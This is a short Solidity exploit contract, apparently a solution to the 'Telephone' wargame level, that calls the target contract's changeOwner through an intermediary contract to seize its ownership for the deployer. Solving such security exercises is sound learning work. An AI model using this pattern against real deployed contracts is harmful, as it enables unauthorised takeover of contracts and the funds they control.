// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Telephone} from "./Telephone.sol";

contract TelephoneThief {
    Telephone public telephone;
    address private owner;

    constructor(address telephoneAddress) {
        telephone = Telephone(telephoneAddress);
        owner = msg.sender;
    }

    function stealTelephone() public {
        telephone.changeOwner(owner);
    }
}
